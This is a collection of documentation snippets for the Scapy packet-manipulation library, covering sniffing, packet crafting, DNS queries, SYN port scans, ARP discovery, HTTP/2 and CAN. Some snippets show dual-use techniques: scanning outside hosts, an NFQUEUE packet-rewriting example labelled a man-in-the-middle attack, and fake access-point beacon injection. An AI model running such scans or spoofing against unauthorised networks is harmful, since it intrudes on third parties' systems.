[
  {
    "owner": "secdev",
    "repo": "scapy",
    "content": "TITLE: Sniffing Network Packets with Scapy in Python\nDESCRIPTION: This code snippet shows how to use Scapy's sniff function to capture network packets, apply filters, and process the captured packets using custom functions.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/usage.rst#2025-04-23_snippet_19\n\nLANGUAGE: python\nCODE:\n```\n>>>  sniff(filter=\"icmp and host 66.35.250.151\", count=2)\n>>>  sniff(iface=\"wifi0\", prn=lambda x: x.summary())\n>>>  sniff(iface=\"eth1\", prn=lambda x: x.show())\n```\n\n----------------------------------------\n\nTITLE: Sending and Receiving CAN Messages Over Linux SocketCAN with Scapy\nDESCRIPTION: Demonstrates how to load the CAN layer, create a CANSocket on interface 'can0', send a CAN packet with ID 0x123, and receive responses including use of sr1() for send-receive operations.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/automotive.rst#2025-04-23_snippet_0\n\nLANGUAGE: python\nCODE:\n```\nload_layer(\"can\")\nload_contrib('cansocket')\n\nsocket = CANSocket(channel='can0')\npacket = CAN(identifier=0x123, data=b'01020304')\n\nsocket.send(packet)\nrx_packet = socket.recv()\n\nsocket.sr1(packet, timeout=1)\n```\n\n----------------------------------------\n\nTITLE: Sending DNS Query and Receiving Response in Python\nDESCRIPTION: Demonstrates how to send a DNS query to retrieve the IPv4 address of www.example.com using Scapy's sr1() function.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/Scapy in 15 minutes.ipynb#2025-04-23_snippet_9\n\nLANGUAGE: python\nCODE:\n```\np = sr1(IP(dst=\"8.8.8.8\")/UDP()/DNS(qd=DNSQR()))\np[DNS].an\n```\n\n----------------------------------------\n\nTITLE: Sending Multiple TCP Packets and Analyzing Responses with Scapy\nDESCRIPTION: Shows how to send multiple TCP packets to different ports, analyze the responses, and display a summary of the results. It also demonstrates how to use retry and timeout parameters for better packet handling.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/usage.rst#2025-04-23_snippet_12\n\nLANGUAGE: python\nCODE:\n```\n>>> sr(IP(dst=\"192.168.8.1\")/TCP(dport=[21,22,23]))\nReceived 6 packets, got 3 answers, remaining 0 packets\n(<Results: UDP:0 TCP:3 ICMP:0 Other:0>, <Unanswered: UDP:0 TCP:0 ICMP:0 Other:0>)\n>>> ans, unans = _\n>>> ans.summary()\nIP / TCP 192.168.8.14:20 > 192.168.8.1:21 S ==> Ether / IP / TCP 192.168.8.1:21 > 192.168.8.14:20 RA / Padding\nIP / TCP 192.168.8.14:20 > 192.168.8.1:22 S ==> Ether / IP / TCP 192.168.8.1:22 > 192.168.8.14:20 RA / Padding\nIP / TCP 192.168.8.14:20 > 192.168.8.1:23 S ==> Ether / IP / TCP 192.168.8.1:23 > 192.168.8.14:20 RA / Padding\n\n>>> sr(IP(dst=\"172.20.29.5/30\")/TCP(dport=[21,22,23]),inter=0.5,retry=-2,timeout=1)\nBegin emission:\nFinished to send 12 packets.\nBegin emission:\nFinished to send 9 packets.\nBegin emission:\nFinished to send 9 packets.\n\nReceived 100 packets, got 3 answers, remaining 9 packets\n(<Results: UDP:0 TCP:3 ICMP:0 Other:0>, <Unanswered: UDP:0 TCP:9 ICMP:0 Other:0>)\n```\n\n----------------------------------------\n\nTITLE: Building HTTP/2 Request Headers with Scapy in Python\nDESCRIPTION: Constructs HTTP/2 request headers for fetching the Google homepage using Scapy's HTTP/2 module. Handles header encoding, compression, and splitting across multiple frames if needed.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/HTTP_2_Tuto.ipynb#2025-04-23_snippet_10\n\nLANGUAGE: python\nCODE:\n```\ntblhdr = h2.HPackHdrTable()\nqry_frontpage = tblhdr.parse_txt_hdrs(\n    ''':method GET\n:path /\n:authority www.google.fr\n:scheme https\naccept-encoding: gzip, deflate\naccept-language: fr-FR\naccept: text/html\nuser-agent: Scapy HTTP/2 Module\n''',\n    stream_id=1,\n    max_frm_sz=srv_max_frm_sz,\n    max_hdr_lst_sz=srv_max_hdr_lst_sz,\n    is_sensitive=lambda hdr_name, hdr_val: hdr_name in ['cookie'],\n    should_index=lambda x: x in [\n            'x-requested-with', \n            'user-agent', \n            'accept-language',\n            ':authority',\n            'accept',\n        ]\n)\nqry_frontpage.show()\n```\n\n----------------------------------------\n\nTITLE: Sending Packets with Scapy Pipes\nDESCRIPTION: This snippet shows how to send packets using the CLIFeeder in Scapy's pipes feature.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/Scapy in 15 minutes.ipynb#2025-04-23_snippet_26\n\nLANGUAGE: python\nCODE:\n```\nclf.send(\"Hello Scapy !\")\n```\n\n----------------------------------------\n\nTITLE: Performing SYN Scans with Scapy\nDESCRIPTION: Demonstrates how to perform SYN scans using Scapy, including single-packet scans and multi-port scans. It also shows how to analyze and display the scan results in different formats.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/usage.rst#2025-04-23_snippet_13\n\nLANGUAGE: python\nCODE:\n```\n>>> sr1(IP(dst=\"72.14.207.99\")/TCP(dport=80,flags=\"S\"))\nBegin emission:\n.Finished to send 1 packets.\n*\nReceived 2 packets, got 1 answers, remaining 0 packets\n<IP  version=4L ihl=5L tos=0x20 len=44 id=33529 flags= frag=0L ttl=244\nproto=TCP chksum=0x6a34 src=72.14.207.99 dst=192.168.1.100 options=// |\n<TCP  sport=www dport=ftp-data seq=2487238601L ack=1 dataofs=6L reserved=0L\nflags=SA window=8190 chksum=0xcdc7 urgptr=0 options=[('MSS', 536)] |\n<Padding  load='V\\xf7' |>>>\n\n>>> sr(IP(dst=\"192.168.1.1\")/TCP(sport=666,dport=(440,443),flags=\"S\"))\n\n>>> sr(IP(dst=\"192.168.1.1\")/TCP(sport=RandShort(),dport=[440,441,442,443],flags=\"S\"))\n\n>>> ans, unans = _\n>>> ans.summary()\nIP / TCP 192.168.1.100:ftp-data > 192.168.1.1:440 S ======> IP / TCP 192.168.1.1:440 > 192.168.1.100:ftp-data RA / Padding\nIP / TCP 192.168.1.100:ftp-data > 192.168.1.1:441 S ======> IP / TCP 192.168.1.1:441 > 192.168.1.100:ftp-data RA / Padding\nIP / TCP 192.168.1.100:ftp-data > 192.168.1.1:442 S ======> IP / TCP 192.168.1.1:442 > 192.168.1.100:ftp-data RA / Padding\nIP / TCP 192.168.1.100:ftp-data > 192.168.1.1:https S ======> IP / TCP 192.168.1.1:https > 192.168.1.100:ftp-data SA / Padding\n\n>>> ans.summary( lambda s,r: r.sprintf(\"%TCP.sport% \\t %TCP.flags%\") )\n440      RA\n441      RA\n442      RA\nhttps    SA\n\n>>> ans, unans = sr(IP(dst=[\"192.168.1.1\",\"yahoo.com\",\"slashdot.org\"])/TCP(dport=[22,80,443],flags=\"S\"))\nBegin emission:\n.......*.**.......Finished to send 9 packets.\n**.*.*..*..................\nReceived 362 packets, got 8 answers, remaining 1 packets\n>>> ans.make_table(\n...    lambda s,r: (s.dst, s.dport,\n...    r.sprintf(\"{TCP:%TCP.flags%}{ICMP:%IP.src% - %ICMP.type%}\")))\n    66.35.250.150                192.168.1.1 216.109.112.135 \n22  66.35.250.150 - dest-unreach RA          -               \n80  SA                           RA          SA              \n443 SA                           SA          SA              \n```\n\n----------------------------------------\n\nTITLE: Creating a Simple IPv6 Ping Tool with Scapy\nDESCRIPTION: This snippet demonstrates how to use Scapy as a module to create a simple IPv6 ping tool. It uses argparse for command-line argument parsing and sends an ICMPv6 echo request.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/Scapy in 15 minutes.ipynb#2025-04-23_snippet_21\n\nLANGUAGE: python\nCODE:\n```\nfrom scapy.all import *\nimport argparse\n\nparser = argparse.ArgumentParser(description=\"A simple ping6\")\nparser.add_argument(\"ipv6_address\", help=\"An IPv6 address\")\nargs = parser.parse_args()\n\nprint(sr1(IPv6(dst=args.ipv6_address)/ICMPv6EchoRequest(), verbose=0).summary())\n```\n\n----------------------------------------\n\nTITLE: Configuring SSL Context for HTTP/2 with ALPN in Python\nDESCRIPTION: Sets up an SSL context with TLS 1.2, specific ciphers, and ALPN protocol for HTTP/2. Wraps the TCP socket in the SSL context.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/HTTP_2_Tuto.ipynb#2025-04-23_snippet_1\n\nLANGUAGE: python\nCODE:\n```\nimport ssl\n# Testing support for ALPN\nassert(ssl.HAS_ALPN)\n\n# Building the SSL context\nssl_ctx = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)\nssl_ctx.set_ciphers(':'.join([  # List from ANSSI TLS guide v.1.1 p.51\n                'ECDHE-ECDSA-AES256-GCM-SHA384',\n                'ECDHE-RSA-AES256-GCM-SHA384',\n                'ECDHE-ECDSA-AES128-GCM-SHA256',\n                'ECDHE-RSA-AES128-GCM-SHA256',\n                'ECDHE-ECDSA-AES256-SHA384',\n                'ECDHE-RSA-AES256-SHA384',\n                'ECDHE-ECDSA-AES128-SHA256',\n                'ECDHE-RSA-AES128-SHA256',\n                'ECDHE-ECDSA-CAMELLIA256-SHA384',\n                'ECDHE-RSA-CAMELLIA256-SHA384',\n                'ECDHE-ECDSA-CAMELLIA128-SHA256',\n                'ECDHE-RSA-CAMELLIA128-SHA256',\n                'DHE-RSA-AES256-GCM-SHA384',\n                'DHE-RSA-AES128-GCM-SHA256',\n                'DHE-RSA-AES256-SHA256',\n                'DHE-RSA-AES128-SHA256',\n                'AES256-GCM-SHA384',\n                'AES128-GCM-SHA256',\n                'AES256-SHA256',\n                'AES128-SHA256',\n                'CAMELLIA128-SHA256'\n            ]))     \nssl_ctx.set_alpn_protocols(['h2'])  # h2 is a RFC7540-hardcoded value\nssl_sock = ssl_ctx.wrap_socket(s, server_hostname=dn)\n```\n\n----------------------------------------\n\nTITLE: Creating a Table of Open Ports with Scapy in Python\nDESCRIPTION: This snippet demonstrates how to create a table of open ports using Scapy's filter and make_table methods, checking for TCP packets with the SYN-ACK flag.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/usage.rst#2025-04-23_snippet_16\n\nLANGUAGE: python\nCODE:\n```\n>>> ans.filter(lambda s,r: TCP in r and r[TCP].flags&2).make_table(lambda s,r:\n...             (s.dst, s.dport, \"X\"))\n```\n\n----------------------------------------\n\nTITLE: Sending Multiple Packets and Analyzing Responses in Python\nDESCRIPTION: Shows how to send multiple DNS queries with different TTL values and analyze the responses using Scapy's srp() function.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/Scapy in 15 minutes.ipynb#2025-04-23_snippet_10\n\nLANGUAGE: python\nCODE:\n```\nr, u = srp(Ether()/IP(dst=\"8.8.8.8\", ttl=(5,10))/UDP()/DNS(rd=1, qd=DNSQR(qname=\"www.example.com\")))\nr, u\n```\n\n----------------------------------------\n\nTITLE: Basic IP Packet Creation in Python using Scapy\nDESCRIPTION: Demonstrates basic IP packet creation and manipulation using Scapy's Python interface. Shows how to create IP packets with various destinations and view their properties.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/introduction.rst#2025-04-23_snippet_0\n\nLANGUAGE: python\nCODE:\n```\n# ./run_scapy -s mysession\nNew session [mysession]\nWelcome to Scapy (2.4.0)\n>>> IP()\n<IP |>\n>>> target=\"www.target.com/30\"\n>>> ip=IP(dst=target)\n>>> ip\n<IP dst=<Net www.target.com/30> |>\n>>> [p for p in ip]\n[<IP dst=207.171.175.28 |>, <IP dst=207.171.175.29 |>,\n <IP dst=207.171.175.30 |>, <IP dst=207.171.175.31 |>]\n>>> ^D\n```\n\n----------------------------------------\n\nTITLE: Manipulating IP Packets in Scapy\nDESCRIPTION: Shows how to create, modify, and inspect IP packet objects using Scapy's interactive shell.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/usage.rst#2025-04-23_snippet_1\n\nLANGUAGE: python\nCODE:\n```\n>>> a=IP(ttl=10) \n>>> a \n< IP ttl=10 |> \n>>> a.src \n'127.0.0.1' \n>>> a.dst=\"192.168.1.1\" \n>>> a \n< IP ttl=10 dst=192.168.1.1 |> \n>>> a.src \n'192.168.8.14' \n>>> del(a.ttl) \n>>> a \n< IP dst=192.168.1.1 |> \n>>> a.ttl \n64 \n```\n\n----------------------------------------\n\nTITLE: Monitoring ARP Traffic with Scapy in Python\nDESCRIPTION: This snippet demonstrates how to use Scapy's sniff() function to monitor ARP traffic on a network. It defines a callback function to process ARP packets and prints the hardware and IP source addresses of ARP requests and replies.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/usage.rst#2025-04-23_snippet_49\n\nLANGUAGE: python\nCODE:\n```\n#! /usr/bin/env python\nfrom scapy.all import *\n\ndef arp_monitor_callback(pkt):\n    if ARP in pkt and pkt[ARP].op in (1,2): #who-has or is-at\n        return pkt.sprintf(\"%ARP.hwsrc% %ARP.psrc%\")\n\nsniff(prn=arp_monitor_callback, filter=\"arp\", store=0)\n```\n\n----------------------------------------\n\nTITLE: Sending Packets with Scapy\nDESCRIPTION: Demonstrates how to send packets at layer 3 and layer 2 using Scapy's send() and sendp() functions.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/usage.rst#2025-04-23_snippet_6\n\nLANGUAGE: python\nCODE:\n```\n>>> send(IP(dst=\"1.2.3.4\")/ICMP())\n.\nSent 1 packets.\n>>> sendp(Ether()/IP(dst=\"1.2.3.4\",ttl=(1,4)), iface=\"eth1\")\n....\nSent 4 packets.\n>>> sendp(\"I'm travelling on Ethernet\", iface=\"eth1\", loop=1, inter=0.2)\n................^C\nSent 16 packets.\n>>> sendp(rdpcap(\"/tmp/pcapfile\")) # tcpreplay\n...........\nSent 11 packets.\n\nReturns packets sent by send()\n>>> send(IP(dst='127.0.0.1'), return_packets=True)\n.\nSent 1 packets.\n<PacketList: TCP:0 UDP:0 ICMP:0 Other:1>\n```\n\n----------------------------------------\n\nTITLE: OS Fingerprinting with Nmap and Scapy in Python\nDESCRIPTION: This example shows how to use Nmap's OS fingerprinting capabilities within Scapy. It loads the Nmap module, ensures the correct database is available, and then performs OS fingerprinting on a target IP address.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/usage.rst#2025-04-23_snippet_55\n\nLANGUAGE: python\nCODE:\n```\nload_module(\"nmap\")\n```\n\nLANGUAGE: python\nCODE:\n```\nnmap_fp(\"192.168.1.1\",oport=443,cport=1)\n```\n\n----------------------------------------\n\nTITLE: Packet Dissection Process in Python/Scapy\nDESCRIPTION: Core dissection sequence showing how packets are broken down into constituent parts. Handles post-dissection processing, padding extraction and payload dissection.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/build_dissect.rst#2025-04-23_snippet_5\n\nLANGUAGE: python\nCODE:\n```\ns = self.post_dissect(s)            \npayl,pad = self.extract_padding(s)\nself.do_dissect_payload(payl)\nif pad and conf.padding:\n    self.add_payload(Padding(pad))\n```\n\n----------------------------------------\n\nTITLE: Using Scapy's TCP Client Automaton in Python\nDESCRIPTION: This code snippet shows how to use Scapy's TCP client automaton to create a TCP connection, send a GET request, and receive the response. It requires Scapy v2.1.1 or later and provides a higher-level interface compared to raw sockets.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/layers/tcp.rst#2025-04-23_snippet_1\n\nLANGUAGE: python\nCODE:\n```\n>>> s = TCP_client.tcplink(Raw, \"www.test.com\", 80)\n>>> s.send(\"GET /\\r\\n\")\n7\n>>> s.recv()\n<Raw  load='<html>\\r\\n<head> ... >\n```\n\n----------------------------------------\n\nTITLE: Sending Multicast and Link-Local Packets in Scapy\nDESCRIPTION: Demonstrates how to send multicast IPv4 and link-local IPv6 packets using Scapy with interface specification. It also shows how to create a ScopedIP object for multicast addressing.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/usage.rst#2025-04-23_snippet_7\n\nLANGUAGE: python\nCODE:\n```\n>>> conf.checkIPaddr = False  # answer IP will be != from the one we requested\n# send on interface 'eth0'\n>>> sr(IP(dst=\"224.0.0.1%eth0\")/ICMP(), multi=True)\n>>> sr(IPv6(dst=\"ff02::1%eth0\")/ICMPv6EchoRequest(), multi=True)\n\n>>> pkt = IP(dst=ScopedIP(\"224.0.0.1\", scope=conf.iface))/ICMP()\n```\n\n----------------------------------------\n\nTITLE: Starting Scapy Interactive Shell in Python\nDESCRIPTION: Demonstrates how to start Scapy's interactive shell with root privileges on Unix-like systems and with administrator privileges on Windows.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/usage.rst#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n$ sudo scapy -H\nWelcome to Scapy (2.4.0)\n>>>\n```\n\nLANGUAGE: batch\nCODE:\n```\nC:\\>scapy\nWelcome to Scapy (2.4.0)\n>>>\n```\n\n----------------------------------------\n\nTITLE: Sniffing Network Packets in Python\nDESCRIPTION: Shows how to sniff network packets using Scapy's sniff() function and process them with a custom function.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/Scapy in 15 minutes.ipynb#2025-04-23_snippet_12\n\nLANGUAGE: python\nCODE:\n```\ns = sniff(count=2)\ns\n```\n\n----------------------------------------\n\nTITLE: Identifying Open Ports using Scapy in Python\nDESCRIPTION: This code snippet shows how to use Scapy to identify open ports by filtering TCP packets with the 'SA' flag and printing the open port numbers.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/usage.rst#2025-04-23_snippet_15\n\nLANGUAGE: python\nCODE:\n```\n>>> ans.summary(lfilter = lambda s,r: r.sprintf(\"%TCP.flags%\") == \"SA\",prn=lambda s,r: r.sprintf(\"%TCP.sport% is open\"))\n```\n\n----------------------------------------\n\nTITLE: Performing DNS Queries with Scapy\nDESCRIPTION: Demonstrates how to use Scapy to send a DNS query and analyze the response. This example includes details about the DNS server's response and potential Etherleak vulnerability.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/usage.rst#2025-04-23_snippet_11\n\nLANGUAGE: python\nCODE:\n```\n>>> sr1(IP(dst=\"192.168.5.1\")/UDP()/DNS(rd=1,qd=DNSQR(qname=\"www.slashdot.org\")))\nBegin emission:\nFinished to send 1 packets.\n..*\nReceived 3 packets, got 1 answers, remaining 0 packets\n<IP version=4L ihl=5L tos=0x0 len=78 id=0 flags=DF frag=0L ttl=64 proto=UDP chksum=0xaf38\n src=192.168.5.1 dst=192.168.5.21 options='' |<UDP sport=53 dport=53 len=58 chksum=0xd55d\n |<DNS id=0 qr=1L opcode=QUERY aa=0L tc=0L rd=1L ra=1L z=0L rcode=ok qdcount=1 ancount=1\n nscount=0 arcount=0 qd=<DNSQR qname='www.slashdot.org.' qtype=A qclass=IN |> \n an=<DNSRR rrname='www.slashdot.org.' type=A rclass=IN ttl=3560L rdata='66.35.250.151' |>\n ns=0 ar=0 |<Padding load='\\xc6\\x94\\xc7\\xeb' |>>>>\n```\n\n----------------------------------------\n\nTITLE: Simple Port Scanner Implementation in Python\nDESCRIPTION: Implements a basic port scanner using Scapy to check common ports on multiple hosts and displays the results in a table format.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/Scapy in 15 minutes.ipynb#2025-04-23_snippet_17\n\nLANGUAGE: python\nCODE:\n```\nans = sr(IP(dst=[\"scanme.nmap.org\", \"nmap.org\"])/TCP(dport=[22, 80, 443, 31337]), timeout=3, verbose=False)[0]\nans.extend(sr(IP(dst=[\"scanme.nmap.org\", \"nmap.org\"])/UDP(dport=53)/DNS(qd=DNSQR()), timeout=3, verbose=False)[0])\nans.make_table(lambda x, y: (x[IP].dst, x.sprintf('%IP.proto%/{TCP:%r,TCP.dport%}{UDP:%r,UDP.dport%}'), y.sprintf('{TCP:%TCP.flags%}{ICMP:%ICMP.type%}')))\n```\n\n----------------------------------------\n\nTITLE: Configuring HTTP/2 Settings in Python with Scapy\nDESCRIPTION: Sets up HTTP/2 settings frames to configure parameters like initial window size, header table size, and max frame size. These settings are sent to the server to establish the connection parameters.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/HTTP_2_Tuto.ipynb#2025-04-23_snippet_8\n\nLANGUAGE: python\nCODE:\n```\n    h2.H2Setting(id = h2.H2Setting.SETTINGS_INITIAL_WINDOW_SIZE, value=win_sz),\n    h2.H2Setting(id = h2.H2Setting.SETTINGS_HEADER_TABLE_SIZE, value=max_hdr_tbl_sz),\n    h2.H2Setting(id = h2.H2Setting.SETTINGS_MAX_FRAME_SIZE, value=max_frm_sz),\n]\n```\n\n----------------------------------------\n\nTITLE: Writing and Reading PCAP Files in Python\nDESCRIPTION: Demonstrates how to write Scapy packets to a PCAP file and read them back using wrpcap() and rdpcap() functions.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/Scapy in 15 minutes.ipynb#2025-04-23_snippet_11\n\nLANGUAGE: python\nCODE:\n```\nwrpcap(\"scapy.pcap\", r)\n\npcap_p = rdpcap(\"scapy.pcap\")\npcap_p[0]\n```\n\n----------------------------------------\n\nTITLE: Basic Protocol Scanning with Scapy\nDESCRIPTION: Demonstrates basic protocol scanning by sending IP packets with different protocol numbers to a target.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/usage.rst#2025-04-23_snippet_38\n\nLANGUAGE: python\nCODE:\n```\nans, unans = sr(IP(dst=\"192.168.1.1\",proto=(0,255))/\"SCAPY\",retry=2)\n```\n\n----------------------------------------\n\nTITLE: Performing TCP Traceroute with Scapy in Python\nDESCRIPTION: This code snippet shows how to perform a TCP traceroute using Scapy, sending TCP SYN packets with increasing TTL values and analyzing the responses.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/usage.rst#2025-04-23_snippet_17\n\nLANGUAGE: python\nCODE:\n```\n>>> ans, unans = sr(IP(dst=target, ttl=(4,25),id=RandShort())/TCP(flags=0x2))\n>>> for snd,rcv in ans:\n...     print snd.ttl, rcv.src, isinstance(rcv.payload, TCP)\n```\n\n----------------------------------------\n\nTITLE: Wireless Frame Injection with Scapy\nDESCRIPTION: Shows how to create a fake wireless access point by injecting beacon frames using Scapy's wireless packet crafting capabilities. Requires a wireless card configured for monitor mode.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/usage.rst#2025-04-23_snippet_35\n\nLANGUAGE: python\nCODE:\n```\nsendp(RadioTap()/\n      Dot11(addr1=\"ff:ff:ff:ff:ff:ff\",\n            addr2=\"00:01:02:03:04:05\",\n            addr3=\"00:01:02:03:04:05\")/\n      Dot11Beacon(cap=\"ESS\", timestamp=1)/\n      Dot11Elt(ID=\"SSID\", info=RandString(RandNum(1,50)))/\n      Dot11EltRates(rates=[130, 132, 11, 22])/\n      Dot11Elt(ID=\"DSset\", info=\"\\x03\")/\n      Dot11Elt(ID=\"TIM\", info=\"\\x00\\x01\\x00\\x00\"),\n      iface=\"mon0\", loop=1)\n```\n\n----------------------------------------\n\nTITLE: Sending and Receiving ICMP Packets with Scapy\nDESCRIPTION: Shows how to use Scapy's sr1() function to send an ICMP packet and receive a response. It also demonstrates how to display the received packet's details.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/usage.rst#2025-04-23_snippet_10\n\nLANGUAGE: python\nCODE:\n```\n>>> p = sr1(IP(dst=\"www.slashdot.org\")/ICMP()/\"XXXXXXXXXXX\")\nBegin emission:\n...Finished to send 1 packets.\n.*\nReceived 5 packets, got 1 answers, remaining 0 packets\n>>> p\n<IP version=4L ihl=5L tos=0x0 len=39 id=15489 flags= frag=0L ttl=42 proto=ICMP\n chksum=0x51dd src=66.35.250.151 dst=192.168.5.21 options='' |<ICMP type=echo-reply\n code=0 chksum=0xee45 id=0x0 seq=0x0 |<Raw load='XXXXXXXXXXX'\n |<Padding load='\\x00\\x00\\x00\\x00' |>>>>\n>>> p.show()\n---[ IP ]---\nversion   = 4L\nihl       = 5L\ntos       = 0x0\nlen       = 39\nid        = 15489\nflags     = \nfrag      = 0L\nttl       = 42\nproto     = ICMP\nchksum    = 0x51dd\nsrc       = 66.35.250.151\ndst       = 192.168.5.21\noptions   = ''\n---[ ICMP ]---\n   type      = echo-reply\n   code      = 0\n   chksum    = 0xee45\n   id        = 0x0\n   seq       = 0x0\n---[ Raw ]---\n      load      = 'XXXXXXXXXXX'\n---[ Padding ]---\n         load      = '\\x00\\x00\\x00\\x00'\n```\n\n----------------------------------------\n\nTITLE: Man-in-the-Middle Attack Using NFQUEUE and Scapy\nDESCRIPTION: This example demonstrates a man-in-the-middle attack using NFQUEUE and Scapy. It intercepts ICMP Echo request messages sent to 8.8.8.8 and modifies their sequence numbers.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/Scapy in 15 minutes.ipynb#2025-04-23_snippet_23\n\nLANGUAGE: python\nCODE:\n```\nfrom scapy.all import *\nimport nfqueue, socket\n\ndef scapy_cb(i, payload):\n  s = payload.get_data()  # get and parse the packet\n  p = IP(s)\n\n  # Check if the packet is an ICMP Echo Request to 8.8.8.8\n  if p.dst == \"8.8.8.8\" and ICMP in p:\n    # Delete checksums to force Scapy to compute them\n    del(p[IP].chksum, p[ICMP].chksum)\n    \n    # Set the ICMP sequence number to 0\n    p[ICMP].seq = 0\n    \n    # Let the modified packet go through\n    ret = payload.set_verdict_modified(nfqueue.NF_ACCEPT, raw(p), len(p))\n    \n  else:\n    # Accept all packets\n    payload.set_verdict(nfqueue.NF_ACCEPT)\n\n# Get an NFQUEUE handler\nq = nfqueue.queue()\n# Set the function that will be call on each received packet\nq.set_callback(scapy_cb)\n# Open the queue & start parsing packes\nq.fast_open(2807, socket.AF_INET)\nq.try_run()\n```\n\n----------------------------------------\n\nTITLE: DNS Query Examples\nDESCRIPTION: Demonstrates different types of DNS queries including A, SOA and MX record lookups.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/usage.rst#2025-04-23_snippet_43\n\nLANGUAGE: python\nCODE:\n```\nans = sr1(IP(dst=\"8.8.8.8\")/UDP(sport=RandShort(), dport=53)/DNS(rd=1,qd=DNSQR(qname=\"secdev.org\",qtype=\"A\")))\nans.an[0].rdata\n\nans = sr1(IP(dst=\"8.8.8.8\")/UDP(sport=RandShort(), dport=53)/DNS(rd=1,qd=DNSQR(qname=\"secdev.org\",qtype=\"SOA\")))\nans.an[0].mname\nans.an[0].rname\n\nans = sr1(IP(dst=\"8.8.8.8\")/UDP(sport=RandShort(), dport=53)/DNS(rd=1,qd=DNSQR(qname=\"google.com\",qtype=\"MX\")))\nresults = [x.exchange for x in ans.an]\n```\n\n----------------------------------------\n\nTITLE: ARP Network Discovery\nDESCRIPTION: Uses ARP requests to discover hosts on a local network segment.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/usage.rst#2025-04-23_snippet_39\n\nLANGUAGE: python\nCODE:\n```\nans, unans = srp(Ether(dst=\"ff:ff:ff:ff:ff:ff\")/ARP(pdst=\"192.168.1.0/24\"), timeout=2)\nans.summary(lambda s,r: r.sprintf(\"%Ether.src% %ARP.psrc%\") )\narping(\"192.168.1.0/24\")\n```\n\n----------------------------------------\n\nTITLE: Building and Dissecting Packets in Scapy\nDESCRIPTION: Shows how to build raw packets from Scapy objects and dissect raw packet data back into Scapy objects.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/scapy/usage.rst#2025-04-23_snippet_3\n\nLANGUAGE: python\nCODE:\n```\n>>> raw(IP())\n'E\\x00\\x00\\x14\\x00\\x01\\x00\\x00@\\x00|\\xe7\\x7f\\x00\\x00\\x01\\x7f\\x00\\x00\\x01'\n>>> IP(_)\n<IP version=4L ihl=5L tos=0x0 len=20 id=1 flags= frag=0L ttl=64 proto=IP\n chksum=0x7ce7 src=127.0.0.1 dst=127.0.0.1 |>\n>>>  a=Ether()/IP(dst=\"www.slashdot.org\")/TCP()/\"GET /index.html HTTP/1.0 \\n\\n\"\n>>>  hexdump(a)   \n00 02 15 37 A2 44 00 AE F3 52 AA D1 08 00 45 00  ...7.D...R....E.\n00 43 00 01 00 00 40 06 78 3C C0 A8 05 15 42 23  .C....@.x<....B#\nFA 97 00 14 00 50 00 00 00 00 00 00 00 00 50 02  .....P........P.\n20 00 BB 39 00 00 47 45 54 20 2F 69 6E 64 65 78   ..9..GET /index\n2E 68 74 6D 6C 20 48 54 54 50 2F 31 2E 30 20 0A  .html HTTP/1.0 .\n0A                                               .\n>>> b=raw(a)\n>>> c=Ether(b)\n>>> c\n<Ether dst=00:02:15:37:a2:44 src=00:ae:f3:52:aa:d1 type=0x800 |<IP version=4L\n ihl=5L tos=0x0 len=67 id=1 flags= frag=0L ttl=64 proto=TCP chksum=0x783c\n src=192.168.5.21 dst=66.35.250.151 options='' |<TCP sport=20 dport=80 seq=0L\n ack=0L dataofs=5L reserved=0L flags=S window=8192 chksum=0xbb39 urgptr=0\n options=[] |<Raw load='GET /index.html HTTP/1.0 \\n\\n' |>>>>\n```\n\n----------------------------------------\n\nTITLE: Parsing HTTP/2 Server Settings in Python\nDESCRIPTION: Extracts specific settings from the server's HTTP/2 settings frame, such as header table size and initial window size.\nSOURCE: https://github.com/secdev/scapy/blob/master/doc/notebooks/HTTP_2_Tuto.ipynb#2025-04-23_snippet_4\n\nLANGUAGE: python\nCODE:\n```\nsrv_max_frm_sz = 1<<14\nsrv_hdr_tbl_sz = 4096\nsrv_max_hdr_tbl_sz = 0\nsrv_global_window = 1<<14\nfor setting in srv_set.payload.settings:\n    if setting.id == h2.H2Setting.SETTINGS_HEADER_TABLE_SIZE:\n        srv_hdr_tbl_sz = setting.value\n    elif setting.id == h2.H2Setting.SETTINGS_MAX_HEADER_LIST_SIZE:\n        srv_max_hdr_lst_sz = setting.value\n    elif setting.id == h2.H2Setting.SETTINGS_INITIAL_WINDOW_SIZE:\n        srv_global_window = setting.value\n```\n\n----------------------------------------\n\nTITLE: Configuring and Using ISOTP Sockets in 